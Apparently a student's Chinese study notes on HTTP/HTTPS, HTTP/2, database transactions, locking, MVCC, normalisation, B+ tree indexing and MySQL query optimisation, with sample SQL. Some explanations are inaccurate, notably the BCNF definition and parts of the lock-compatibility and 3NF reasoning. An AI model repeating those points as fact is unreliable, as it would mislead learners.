代理服务器分为正向代理和反向代理两种：

![image-20250407160402717](D:\typora图片\image-20250407160402717.png)

**网关**

网关服务器会将 HTTP 转化为其它协议进行通信，从而请求其它非 HTTP 服务器的服务。

![img](D:\typora图片\raw)

这是网关的作用，接收协议然后转发到不同的服务器上

**隧道**

使用 SSL 等加密手段，在客户端和服务器之间建立一条安全的通信线路。

## HTTPS

HTTP具有下面三个缺点：

- 使用明文进行通信，内容可能会被窃听；
- 不验证通信方的身份，通信方的身份有可能遭遇伪装；
- 无法证明报文的完整性，报文有可能遭篡改。

HTTPS对此做出修改和调整，HTTPS流程如下所示

> 1. 客户端向服务器发送client-hello的请求，里面包含客户端所支持的HTTP协议，加密算法以及随机生成数Clinet_number
> 2. 服务器向客户端发送自己的证书，里面包含加密算法，随机数Server_number以及服务器的证书（里面包含公钥）
> 3. 客户端检验证书，并生成pre_master_secret数，并用公钥对这个数进行加密，然后发给服务器
> 4. 服务器用私钥进行解密得到pre_master_secret，这样通信双方都知道三个数：Clinet_number，Server_number以及pre_master_secret
> 5. 后面所有的请求以及通信都采用对称加密进行传输

**认证**

通过CA对通信方进行认证

> 1. 服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对服务器已申请的公开密钥用CA本身的私钥做数字签名
>
> 2. 在进行HTTPS通信的时候，服务器会将证书发送给客户端，里面有数字签名，由于浏览器内置了一批CA机构的公钥，所以客户端可以用公钥解密数字签名。
>
> 3. 客户端根据证书里面的哈希算法和加密算法对证书的内容进行计算，如果得到的值和第2步一样的话，那么就是通过认证

 **完整性保护**

> HTTPS 的报文摘要功能之所以安全，是因为它结合了加密和认证这两个操作。

## HTTP2.0

HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的，是进行分开发送的。在1.0里面，HEADERS和DATA是合在一起发送的

**服务器推送**

HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。

> 例如：
>
> 客户端请求GET /index.html，那么服务器会返回  index.html
>
>   + Server Push: style.css
>   + Server Push: script.js
>
> 但是HTTP1.0不会如下操作：
> 客户端请求：GET /index.html HTTP/1.0
> 服务器响应HTML代码里面会有如下代码：
>
> <link rel="stylesheet" href="style.css">
>
> <script src="script.js"></script>
>
> 浏览器解析HTML代码，并发现还有style.css和script.js，那么就会 重新向服务器发起请求，请求这两个资源

**首部压缩**

> HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。
>
> HTTP/2.0 要求==客户端和服务器同时维护和更新一个包含之前见过的首部字段表==，从而避免了重复传输。

## GET和POST区别

**参数传递的位置**

> GET的参数是在URL中的
>
> POST的参数是在请求体中的

**安全**

> GET方法是安全的，因为只是读取资源
>
> POST方法是不安全的，因为POST会上传内容，服务器可能会将这些内容存储到数据库中

**幂等性**

> 幂等的意思是同样的请求被执行一次与连续执行多次的效果是一样的
>
> GET请求是幂等的，POST请求不是幂等的
>
> POST请求多次那么就会提交多次资源

 **可缓存**

> GET是可以缓存的
>
> POST是不可缓存的

# 数据库

## 数据库系统原理

### 事务

> 事务指的是满足ACID特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。
>
> ACID特征：
>
> 1. 原子性：事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚
> 2. 一致性：ACID一致性确保了在并发事务执行时，数据库的状态保持一致，不会出现数据混乱或不一致的情况
> 3. 隔离性：一个事务做的操作在提交之前别的事务是不可见的
> 4. 持久性：事务一旦提交了，其做的修改将会永远保存在数据库中，即使系统发生崩溃，事务执行的结果也不能丢

### 并发一致性问题

> 1. 丢失修改：事务T1在对数据A进行修改还没提交，T2随即对数据A进行修改并提交，覆盖了事务T1的修改
> 2. 读脏数据：事务T2读取到了事务T1修改了但是还没提交的数据，如果T1此时进行回滚的话，那么T2读到的就是脏数据
> 3. 不可重复读：事务T2读取数据A后还没结束事务，事务T1在事务T2还没结束的时候修改数据A，T2再次读取数据A的时候发现前后两次读取的数据A的结果不一致
> 4. 幻读：和不可重复读很类似，事务T2读取了一个范围的数据（例如根据数据库的语句匹配对应的数据），此时事务T1在这个范围内插入新的数据，导致T1和T2前后两次读取的数据不一致

**产生并发不一致的问题主要原因是破坏了事务的隔离性，解决办法是通过并发控制来保证隔离性，并发控制可以通过封锁来实现。**

### 封锁

**封锁粒度**

MySQL中提供了两种封锁的粒度：行级锁和表级锁

> 在加锁的时候需要注意只锁定需要修改的那部分数据，而不是所有的资源。锁的数据越少，发生锁争用的可能越小，并发程度越高
>
> 加锁需要消耗资源，锁的各种操作都会增加系统开销，所以封锁粒度越小，系统开销越大

**封锁类型**

是锁的粒度和作用范围

读写锁

- 互斥锁（Exclusive），简写为 X 锁，又称写锁。
- 共享锁（Shared），简写为 S 锁，又称读锁。

> 两个规定：
> 事务T1对数据A加了X锁，其他事务就不能对数据A加任何锁
>
> 事务T1对数据A加了S锁，其他事务可以对数据A加S锁，但是不能加X锁

![img](D:\typora图片\image-20191207213523777.png)

意向锁

意向锁是IX/IS锁，这个表示当前事务==有意向==对数据A进行写/读操作

> 两个规定：
>
> 事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁；
>
> 事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。

![img](D:\typora图片\image-20191207214442687.png)

> 1. X锁和其他所有的锁都是不可兼容的
>
> 2. IX锁是表级锁，会对整个表进行加锁，如果此时已经有X锁（行级锁）的话，表明有事务对某一行数据进行修改，就不能再加上表级锁，所以IX和X锁是不兼容的。IX锁表示事务有意愿对数据进行修改，那么就不可以进行S操作。
> 3. S锁加上后不能进行X/IX写操作
> 4. IS锁不能和X兼容

### 封锁协议

封锁协议是一种规定，描述了事务在何时、如何获取和释放锁以及允许哪些类型的锁，以确保数据库操作的一致性和隔离性。

**三级封锁协议**

> 1. 一级封锁协议：事务T要对数据A修改必须加上X锁，直到事务结束才释放，可解决丢失修改的问题（因为不能有两个事务对同一数据进行修改）
> 2. 二级封锁协议：在一级封锁协议的基础上，要求读取数据A必须加上S锁，读完马上释放S锁，可以解决读取脏数据的问题。
> 3. 三级封锁协议：在二级的基础上，要求读取数据A必须加上S锁，直到事务结束后释放，可解决不可重复读的问题。

**两段锁协议**

两段锁协议是可串行化调度（事务并发执行的结果和事务按照顺序串行执行的结果是一致的）的充分条件

> 加锁和解锁分为两个阶段运行
>
> 一次性加锁然后一次性解锁
>
> 例如：
>
> lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B) # A B C表示的是资源的名称

**MySQL隐式和显式锁定**

MySQL的InnoDB存储引擎==（存储引擎决定着数据库如何存储和管理数据）==采用的是两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是同一时间释放，这叫做隐式锁定

InnoDB 也可以使用特定的语句进行显示锁定：

```sql
SELECT ... LOCK In SHARE MODE;
SELECT ... FOR UPDATE;
```

### 隔离级别

**未提交读**

> 事务对数据的修改，即使还没提交，对于其他事务也是可见的

**提交读**

> 事务对数据的修改，在提交前对其他事务是不可见的

**可重复读**

> 保证同一个事务多次读取同一个数据的结果都是一样的

**可串行化**

> 强制事务串行执行，这样事务之间互不干扰，就不会出现不一致的问题

![img](D:\typora图片\image-20191207223400787.png)

### 多版本并发控制（MVCC）

多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。

> 由于在实际应用中，读操作比写操作要频繁很多，所以MVCC中写操作去读取最新的版本快照，读操作去读旧版本的快照
>
> 在 MVCC 中事务的修改操作（DELETE、INSERT、UPDATE）会为数据行新增一个版本快照。为了解决脏读和不可重复读的问题，MVCC 规定只能读取已经提交的快照

**版本号**

> 系统版本号 SYS_ID：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。
>
> 事务版本号 TRX_ID ：事务开始时的系统版本号。
> 
>
>
> 由于在MVCC中规定事务的读操作读的时候事务开始时的快照，所以系统的版本号就会对应的是事务初始时的快照，供读操作使用
>
> 而事务版本号就对应着事务对数据进行哪些操作的记录
> 
>
>
> 注意！！！
>
> 事务版本号TRX_ID开始的时候是由系统版本号SYS_ID得到的，所以开始的时候TRX_ID是等于SYS_ID的，但是SYS_ID是会随着事务而增加的，但是TRX_ID就不会变化。

**Undo日志**

MVCC的多版本指的是多个版本的快照，快照存储在Undo日志中，该日志通过回滚指针 ROLL_PTR 把一个数据行的所有快照连接起来。

例如在 MySQL 创建一个表 t，包含主键 id 和一个字段 x。我们先插入一个数据行，然后对该数据行执行两次更新操作。

```sql
INSERT INTO t(id, x) VALUES(1, "a");
UPDATE t SET x="b" WHERE id=1;
UPDATE t SET x="c" WHERE id=1;


#  这个是START TRANSACTION的用法

START TRANSACTION;

INSERT INTO t(id, x) VALUES(1, "a");
UPDATE t SET x="b" WHERE id=1;
UPDATE t SET x="c" WHERE id=1;

COMMIT;

```

上面没有用START TRANSACTION是将操作当成一个事务来执行，根据 MySQL 的 AUTOCOMMIT 机制，每个操作都会被当成一个事务来执行，所以上面的操作总共涉及到三个事务。快照中除了记录事务版本号 TRX_ID 和操作之外，还记录了一个 bit 的 DEL 字段，用于标记是否被删除。（如果有用START TRANSACTION那么就是所有的操作当成一个事务来处理。）

![img](D:\typora图片\image-20191208164808217.png)

如果加上START TRANSACTION的话Undo日志如下，都是同一个TRX_ID的。

<img src="D:\typora图片\646d2f3c-55a0-47f8-8dc4-2589f96dfc52.png" alt="646d2f3c-55a0-47f8-8dc4-2589f96dfc52" style="zoom:33%;" />

INSERT、UPDATE、DELETE 操作会创建一个日志，并将事务版本号 TRX_ID 写入。DELETE 可以看成是一个特殊的 UPDATE，还会额外将 DEL 字段设置为 1。

**ReadView**

MVCC维护了额一个ReanView结构，里面包含着当前系统未提交的事务列表TRX_IDs {TRX_ID_1, TRX_ID_2, ...}，还有该列表的的最小值TRX_ID_MIN 和最大值 TRX_ID_MAX（不代表在TRX_ID_MIN 和TRX_ID_MAX区间内的所有事务都是活跃的，有的事务可能是已经提交了的）。

在进行SELECT操作的时候，会根据数据行快照的 TRX_ID 与 TRX_ID_MIN 和 TRX_ID_MAX 之间的关系，从而判断数据行快照TRX_ID 是否可以使用（每一行数据都有一个TRX_ID，这个ID表示这行数据最后一次被修改的事务是哪个）

TRX_ID 与 TRX_ID_MIN 和 TRX_ID_MAX 之间的关系

1. TRX_ID < TRX_ID_MIN：表明当前行数据最后一次修改的时候是在事务创建之前就被提交了，那么当前行数据就是可以被访问的
2. TRX_ID > TRX_ID_MAX：表明当前行数据最后一次修改的时候是在当前事务之后的事务创建的，根据MVCC的规则，当前事务在其快照中只看到在它启动前提交的事务所做的修改；而那些在其启动之后发生的修改，无论以后是否提交，都不会在当前事务的快照中显示。
3. TRX_ID_MIN <= TRX_ID <= TRX_ID_MAX，需要根据隔离级别再进行判断：

- ==提交读==：如果TRX_ID是在TRX_IDs（即活跃事务）内部的，则表明当前行对应的事务还没提交，当前快照不可用。如果TRX_ID不在TRX_IDs里面的，那么就说明已经提交了，那么当前快照可以用。
- ==可重复读==：无论TRX_ID是否在TRX_IDs里面都是，快照都是不可使用的，因为如果可以使用的话，那么其它事务也可以读到这个数据行快照并进行修改，那么当前事务再去读这个数据行得到的值就会发生改变，也就是出现了不可重复读问题

如果在数据行快照不可使用的情况下，需要沿着 Undo Log 的回滚指针 ROLL_PTR 找到下一个快照（下一个快照就是比当前数据行修改更早的快照，因为后面修改的就是在头部的位置）

**快照读与当前读**

1. 快照读：MVCC的SELECT操作是快照中的数据，不需要进行加锁的
2. 当前读：MVCC其他会对数据库进行修改的操作（INSERT、UPDATE、DELETE）需要加锁

```sql
SELECT * FROM table WHERE ? lock in share mode;   # 这个是对读操作进行加锁
SELECT * FROM table WHERE ? for update;           # 如果要修改的话这个是对写操作进行加锁
```

> SELECT * FROM table WHERE ? for update; 
>
> 在（INSERT、UPDATE、DELETE）操作的时候，系统会自动的帮我们加上排他锁，加上这种显式锁可以实现下面的操作：
>
> 需要根据读取的数据来判断是否要读最新的数据，因为如果不加上显式锁的话读完了就会释放锁，那么就无法根据条件判断是否需要读取最新的数据。（但是INSERT操作不需要加上SELECT * FROM table WHERE ? for update;，因为这个是适用于对已经存在的数据进行加锁操作）

## Next-Key Locks

MVCC只能保证已存在的数据的固定版本，但是幻影读是插入新的数据，MVCC对这种插入新的数据是无法解决幻影读问题的。使用 MVCC + Next-Key Locks 可以解决幻读问题。

### Record Locks

锁定一个记录上的索引，而不是记录本身。如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚簇索引，因此 Record Locks 依然可以使用。

### Gap Locks

锁定索引之间的间隙，但是不包含索引本身。什么是索引之间的间隙呢，就是比如当前查找的数据对应的索引是10-20，那么如果加上gap锁的话，10-20的索引就不会被修改（如果我此时想要插入索引位15的值就会被拒绝）

### Next-Key Locks

是Record Locks和Gap Locks的结合，不仅锁定的是一个记录的索引，也锁定索引之间的间隙。锁定的是一个前开后闭区间

## 关系数据库设计理论

关系数据库和非关系数据库的区别：

**关系数据库**：基于表结构、关系模型和 SQL 查询语言，强调数据完整性和事务一致性，适合复杂业务逻辑且数据关系固定的场景。

**非关系数据库**：采用灵活的数据模型，不需要预定义模式，易于水平扩展，适合大规模数据和高并发应用的场景，同时支持多种数据类型和结构。

### 函数依赖

假设有一个关系 R，其中 X 和 Y 都是 R 的属性（或属性集）。如果对于 R 中的任意两个元组（记录），只要它们在 X 上的值相同，则它们在 Y 上的值也必然相同，我们就说 Y 函数依赖于 X。（就是X值相同的那么Y值也一定相同）

### 异常

- 冗余数据：例如 `学生-2` 出现了两次。
- 修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。
- 删除异常：删除一个信息，那么也会丢失其它信息。例如删除了 `课程-1` 需要删除第一行和第三行，那么 `学生-1` 的信息就会丢失。
- 插入异常：例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入

### 范式

范式理论是为了解决上述提到的四种异常

可以参考https://blog.csdn.net/Sankkl1/article/details/129335961

> 平凡依赖表示的是若X->Y，且Y是X的子集，那么就是平凡依赖
>
> 非平凡依赖表示的是若X->Y，且Y不是X的子集，那么就是非平凡依赖

高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。

1. 第一范式（1NF）

要求的是表中每个属性（字段）的值都是原子的，也就是说每个字段只能存储一个不可再分割的值。这一要求既适用于构成主键的属性，也适用于非键属性

2.  第二范式 (2NF)

在满足第一范式的情况下，数据库中的每一列都和主键相关，而不能只和主键的某一部分相关（主要是在联合主键的情况下）。若某个非主键属性 X 只依赖于 A 或 B 的一部分，而不是同时依赖 A 和 B，那么就存在部分依赖，那么就不满足第二范式。

3. 第三范式（3NF）

满足前面两个范式的情况下同时还要满足，不能有传递依赖。例如A->B B->C，但是A不能直接推出C（得借助B才可以）

传递依赖是：A->B B->C，这个就是传递依赖

4. BCNF范式

对于每个非平凡的函数依赖 X → Y，X 必须是一个超键，也就是能唯一标识记录的属性或属性组合，就是X不能是复合主键

就是如果有A、B、C三个键的话，A->C，那么A一定是主键并且A->B

## ER图

Entity-Relationship，有三个组成部分：实体、属性、联系

###  实体的三种联系

包含一对一，一对多，多对多三种

- 如果 A 到 B 是一对多关系，那么画个带箭头的线段指向 B；
- 如果是一对一，画两个带箭头的线段；
- 如果是多对多，画两个不带箭头的线段。

###  表示出现多次的关系

一个实体在联系出现几次，就要用几条线连接。下图表示一个课程的先修关系，先修关系出现两个 Course 实体，第一个是先修课程，后一个是后修课程，因此需要用两条线来表示这种关系。 `Predecessor` 和 `Successor` 是 实体在关系中的“角色名”

![img](D:\typora图片\ac929ea3-daca-40ec-9e95-4b2fa6678243.png)

### 联系的多向性

联系是菱形的

虽然老师可以开设多门课，并且可以教授多名学生，但是对于特定的学生和课程，只有一个老师教授，这就构成了一个三元联系。

![img](D:\typora图片\5bb1b38a-527e-4802-a385-267dadbd30ba.png)

###  表示子类

用一个三角形和两条线来连接类和子类，与子类有关的属性和联系都连到子类上，而与父类和子类都有关的连到父类上。

![img](D:\typora图片\14389ea4-8d96-4e96-9f76-564ca3324c1e.png)



# MySQL

## VIEW

VIEW视图本身不存储数据，是建立在一个或者多个表的虚拟表，而是保存了一条查询语句。当查询视图时，数据库系统会将视图的定义（保存的查询语句）与用户的查询语句结合起来，生成一个完整的查询语句，然后直接对原始的表进行查询。

```sql
--假设这样创建视图

CREATE VIEW EmployeeInfo AS
SELECT employee.name, employee.department
FROM employee;

--用户的查询语句如下
SELECT * FROM EmployeeInfo WHERE department = 'Sales';

--数据库系统实际的操作是这样的
SELECT employee.name, employee.department
FROM employee
WHERE employee.department = 'Sales';
```

特点：

1. 逻辑抽象：可以将复杂的多表JOIN，过滤条件、计算表达式等封装进视图，客户端只需要进行简单的查询即可

```sql
--创建一个新的视图

CREATE VIEW vip_user_order_stats AS
SELECT
    u.username,
    SUM(od.quantity) AS total_products,
    SUM(od.quantity * od.price) AS total_amount,
    AVG(od.quantity * od.price) AS avg_amount
FROM
    orders o
JOIN
    users u ON o.user_id = u.user_id
JOIN
    order_details od ON o.order_id = od.order_id
WHERE
    u.user_level = 'VIP'
    AND o.order_date >= DATE_SUB(CURDATE(), INTERVAL 1 YEAR)
GROUP BY
    u.username;
    
-- 用户查询的时候只需要简单的查询语句就可以获取需要的数据

SELECT * FROM vip_user_order_stats;
```

2. 安全隔离：可以给某些用户访问特定视图的权限，而不是暴露基础表的全部行或者列

3. 更新限制：

   简单视图（基于单表、直接列投影、无聚合、无 `DISTINCT`、无子查询、无计算列）通常可以 `INSERT`/`UPDATE`/`DELETE`

   复杂视图（多表关联、聚合、分组等）一般只读，不能直接修改



## 索引

二叉搜索树，AVL树，红黑树都是在内存中进行的，这些树都是比较小的，无法处理硬盘中较多的数据，所以硬盘中的数据采用的是B/B+树来进行检索

### B树

可以看这个视频：https://www.bilibili.com/video/BV1tJ4m1w7yR?spm_id_from=333.788.videopod.sections&vd_source=d5336924b1b9449b7d38d5ca22bd9019

B树的特点

> 1. 平衡：所有的叶节点都在同一层，都在最后一层
>
> 2. 有序：元素的左子树都是小于当前元素，右子树都是大于当前元素
>
> 3. 多路：对于m阶的B树结点：
>
>    最多：m个分支，m - 1个元素
>
>    最少：根节点要有：2个分支，1个元素；其他节点：（m/2向上取整）个分支，（m/2向上取整-1）个元素

**插入**

> 1. 先查找插入的位置进行插入
> 2. 如果没有上溢出则无需调整
> 3. 否则中间元素(m/2向上取整)上移，两边分裂

例如：3阶B树的话，那么中间元素就是3/2向上取整就是2，那么就是将第二个元素进行分裂

**删除**

> 删除非叶子节点的话其实就会转换成为叶子节点的删除的
>
> 删除的是叶节点元素：
>
> 1. 没有溢出则无需调整
> 2. 下溢出（就是结点的元素不够）：（1） 找兄弟借，兄弟够借的话那么就是父结点下来，兄弟结点上去
>
> （2）找兄弟借，兄弟不够借（可能导致父结点下溢出）：父结点下移到左边，然后右边的合并过来

### B+树

B+树的特点

顺序查找：逐个搜索数据中的每一项直到找到想要的元素

随机查找：直接定位到目标元素的所在位置

范围查找：查找满足区间条件的所有元素（例如查找10~50的话，那么就先查找10，然后再查找50）

> 和B树不同的是：
>
> m阶的B+树==最多==有m个分支，每个分支==最多==有m个结点（而不是B树的m-1个结点）
>
> B+树可以直接在叶结点进行查找，因为叶子结点也有一个head头指针，但是B树只能通过中序遍历进行查找
>
> B+树兼顾顺序查找和随机查找，还可以很方便进行范围查找

B树是所有结点的关键字都有指向对应记录的指针，但是B+树的话不是这样的，B+树只有==叶子结点==包含关键字以及指向对应记录的指针，非叶子结点只做索引

![image-20250413113656601](D:\typora图片\image-20250413113656601.png)

与红黑树的不同，B+树的优点

> 1. 红黑树本质是二叉树，所以每个结点只有一个元素，但是B/B+树每个结点不止一个元素，所以就会有更低的树高
> 2. 磁盘访问是按“页”来读的，B/B+树的设计是将一个节点大小设计为一个磁盘页的大小，那么每次I/O操作都会读取一整页的数据
> 3. 利用磁盘预读（每次读取的时候会将邻居的也一起读出来），B+ 树的 叶子节点是顺序连接的，但是红黑树的是分散的，所以B+树更适合文件系统

### MySQL索引

索引的作用是加快查找数据的速度，就像是书本的目录一样

下面三种情况不适合使用索引：

1. 数据量很小的时候，只需要从头开始遍历就好了，不需要索引
2. 搜索结果会返回大量数据，此时会找到对应的主键然后再根据主键去表里查数据，不如直接从头遍历到尾巴
3. 频繁更新的数据，更新数据不只是更新数据的值也得更新数据的索引，例如在B+树中更新数据的话，会导致树对应的索引改变

**B+树索引**

InnoDB 的 B+Tree 索引分为主索引和辅助索引。

> ==主索引==是以主键为key构造的B+树索引，里面的叶子结点存储的是完整的数据记录，这种索引方式被称为聚簇索引，每个表只有一个聚簇索引
>
> ==辅助索引==是非主键为key对应构造的B+树索引，B+树叶子结点没有数据记录，是存储着非主键对应的主键值
>
>
> 流程：
>
> 如果是用的是主键进行查找的话，那么就直接去主索引里面的叶子结点查找对应的数据（例如：where id=xxx）
>
> 如果用的是非主键进行查找的话，就会先根据辅助索引找到对应的主键，然后按照主键去主索引的叶子结点找数据

**哈希索引**

哈希索引适用于等值查找（例如：SELECT * FROM Employee WHERE department = 'Sales';），不支持范围查找和部分查找。

将要查询的值进行哈希计算然后看是属于哪个槽呢，例如Sales可能经过哈希计算后结果是587，然后直接定位到存储 'Sales' 的桶，桶里面存放的是数据指针，数据指针对应的是磁盘中的值

**全文索引**

全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。适用于查找文中的关键字，而不是直接比较是否相等

MyISAM（MySQL早期的存储引擎）支持全文索引，记录着关键词到其所在文档的映射

**空间数据索引**

当数据具有二维或多维坐标，可通过空间索引高效进行

多维数据往往具有空间聚集特性，空间索引可以将相近的数据存储在同一区域内，通过树的分层结构迅速定位到目标区域

### 索引优化

| 查询条件         | 是否使用索引 | 原因                         |
| ---------------- | ------------ | ---------------------------- |
| `LIKE '索引%'`   | ✅ 可以       | 开头匹配，能用索引加速       |
| `LIKE '%索引'`   | ❌ 不行       | 以 `%` 开头，无法利用索引    |
| `LIKE '%索引%'`  | ❌ 不行       | 同上，必须全表扫描           |
| `LIKE '索引___'` | ✅ 可以       | 固定前缀长度匹配，仍可用索引 |

**独立的列**

针对一个字段建立索引（如果是下面的语句的话，那么就对actor_id建立索引）

```sql
SELECT actor_id FROM sakila.actor WHERE actor_id = 5;
```

**多级索引**

针对多个字段建立索引，例如actor_id和film_id字段建立索引

在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。

```sql
SELECT film_id, actor_ id FROM sakila.film_actor
WHERE actor_id = 1 AND film_id = 1;
```

**索引列的顺序**

让==索引选择性==最强的索引放在最前面

索引的选择性是：不重复的索引值和记录总数的比值。选择性越高表示区分度越高，查询效率也越高

**前缀索引**

对于 BLOB（非结构化二进制文件例如图像什么的）、TEXT（大段文字内容例如博客什么的） 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符

**覆盖索引**

如果一次查询所需要的所有字段都能在索引中找到，就称为覆盖索引

例如下面的代码，为users表的name，age创建索引，那么下面查询age和name的时候就命中了索引，这就是覆盖索引

```sql
CREATE INDEX idx_name_age ON users(name, age);
SELECT age FROM users WHERE name = 'Tom';
```

**索引优化的优点**：

1. 索引通常远小于数据行的大小，只读取索引可以大大减少数据访问量
2. 一些存储引擎(例如MyISAM)在内存中只缓存索引（只有少部分数据在内存中），而数据是依赖于操作系统来缓存（其他大部分数据是在磁盘中的，需要的时候由操作系统调用进入内存）的，所以可以只访问索引而不进行系统调用
3. 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。

**索引的优点**

1. 大大减少了服务器需要扫描的数据行数
2. 帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，不需要排序和分组，也就不需要创建临时表）
3. 将随机的I/O变成顺序I/O（就是访问局部性原理，访问当前的元素很有可能会访问其邻近的元素，顺序I/O就能很好的读取临近的元素）

**索引的使用条件**

1. 对于很小的表来说，大部分情况下全表扫描会比建立索引更加高效
2. 对于中大型表，索引非常有效
3. 对于需要频繁插入删除数据的表来说，维护索引会有比较大的代价
4. 对于特大型的表，维护和建立索引的代价会随之增长，这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术（就是将一张大的表按照规则拆成多张逻辑子表，例如orders表有 5 亿条数据，你可以按年份进行子表的建立）

## 查询性能优化

索引和查询性能的区别：索引是工具，查询性能是结果表现

查询性能包括索引，SQL语句以及表结构设计

### Explain

使用Explain可以分析SELECT查询语句，会告诉我们查询语句是如何进行的

- select_type : 查询类型，有简单查询、联合查询、子查询等
- key : 使用的索引
- rows : 扫描的行数

### 优化数据访问

**减少请求的数据量**

只返回必要的列：最好不要用SELECT *

只返回必要的行：使用LIMIT语句来限制返回的数据

缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别是对于要被重复查询的数据，缓存的性能提升很明显

**减少服务端扫描的行数**

扫描的行数意思是就是需要检索多少行的数据，最有效的方法就是使用覆盖索引

### 重构查询方式

重构查询方式的意思是：在不改变查询结果的前提下，对SQL语句进行改写或调整结构

**切分大查询**

下面的DELETE是一条删除语句，如果删除的数据有几百万行的话，那么就可能一次性锁住很多的数据，占满整个事务日志

```sql
DELETE FROM messages WHERE create < DATE_SUB(NOW(), INTERVAL 3 MONTH);

# 切分上面的大查询语句为小的语句
rows_affected = 0
do {
    rows_affected = do_query(
    "DELETE FROM messages WHERE create  < DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000")
} while rows_affected > 0
```

**分解大连接查询**

JOIN的几个类型

| JOIN 类型         | 说明                                              |
| ----------------- | ------------------------------------------------- |
| `INNER JOIN`      | **只返回匹配的行**（最常用）                      |
| `LEFT JOIN`       | 返回左表所有行，即使右表没有匹配                  |
| `RIGHT JOIN`      | 返回右表所有行，即使左表没有匹配                  |
| `FULL OUTER JOIN` | 返回左右表所有行（MySQL 不支持，可用 UNION 模拟） |
| `CROSS JOIN`      | 笛卡尔积（每行都和另一表的每行配对）              |

将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：

1. 缓存更高效，因为如果分解成为多个查询之后，那么即使一个表发生变化，其他表的查询缓存依然可以使用（当你执行一条查询时，如果这条SQL和它涉及的表**都没有发生变化**，那么下一次执行这条相同的查询就可以**直接返回缓存的结果**，不用再执行一遍。）
2. 分解成为多个查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询（SELECT name FROM users WHERE id = 1; 例如得到这个结果的话，那么其他查询语句可能也是想要得到这个结果，那么其他也可以用）
3. 减少锁竞争；
4. 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。

> 传统的做法，多个表必须==在同一个数据库里==，否则就无法JOIN

✅ 数据库层连接（传统做法）：

```
sql复制编辑SELECT u.name, o.amount
FROM users u
JOIN orders o ON u.id = o.user_id
WHERE u.id = 1;
```

由数据库自己连接 `users` 和 `orders` 两张表。

> 在应用层连接就是可以使用Python和Java等高级语言进行数据库的连接，多个表可以在==不同的数据库里==，先从各个数据库读取数据然后再用代码进行拼接

✅ 应用层连接（你写代码连接）：

```
# 第一步，在应用程序中执行：
SELECT name FROM users WHERE id = 1;

# 第二步，再执行：
SELECT amount FROM orders WHERE user_id = 1;

# 最后在代码中“拼接”成：
{ "name": "Tom", "orders": [100, 200, ...] }
```

就是你**在应用逻辑中控制“先查谁，再查谁”，再把它们拼起来**。

5. 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。

```sql
SELECT * FROM tag
JOIN tag_post ON tag_post.tag_id=tag.id
JOIN post ON tag_post.post_id=post.id
WHERE tag.tag='mysql';

# 使用IN代替连接查询
SELECT * FROM tag WHERE tag='mysql';
SELECT * FROM tag_post WHERE tag_id=1234;
SELECT * FROM post WHERE post.id IN (123,456,567,9098,8904);
```

## 存储引擎

### InnoDB

是MySQL默认的事务型存储引擎，只有当需要Mysql不支持的其他特性的时候，才会用其他存储引擎

InnDB采用的是聚簇索引，这样查主键时只需要一次 B+ 树遍历即可拿到所有列，避免了二次回表带来的额外随机 I/O。可以通过采用 MVCC+ Next-Key Locking防止幻影读

==注意！！！==

> InnoDB在查找数据的时候，例如查找索引为35的数据，那么会先将35和Buffer pool(缓冲池)中的索引进行对比，如果有的话就直接返回数据，如果没有的话就会到磁盘中查找B+树，找到35对应的叶子节点，叶子节点里面就包含了所有的数据。

针对于InnoDB内部做了很多优化，包括从磁盘读取的时候采用可预测读，能够加快读操作并且创建自适应的哈希索引（数据库检测到某些索引值的访问非常频繁，它会自动在内存中为这些索引值建立哈希索引，那么查找的时候就会很快）。InnoDB会使用插入缓冲区来合并插入操作。插入缓冲区会将多个插入操作合并到一个批量写入操作中，减少磁盘 I/O 的次数。

InnoDB还支持在线热备份，就是在数据库持续对外提供读写服务的情况下，对其数据进行备份

原理：

> 在线热备份就是：
>
> - **不停机器、不停业务**：备份时数据库依然可以读写，不会影响用户操作。
> - **拷贝数据＋记录日志**：把当前的数据文件复制一份，同时记录下这段时间的日志（redo log/二进制日志）。
> - **恢复时合并日志**：把备份的文件恢复到新环境，再把日志按先后顺序“回放”进去，保证数据和你备份时刻完全一致。
>
> 简单来说，就是“数据库在线运行时，安全地把数据复制出来，一会儿再加上中间写入的日志”，就能得到一份完整、可用的备份，而无需停机。

### MyISAM

设计简单，数据以紧密格式存储。适用于只读数据，比较小的表，可以容忍恢复操作，则可以使用MyISAM

提供了压缩表、空间数据索引等。

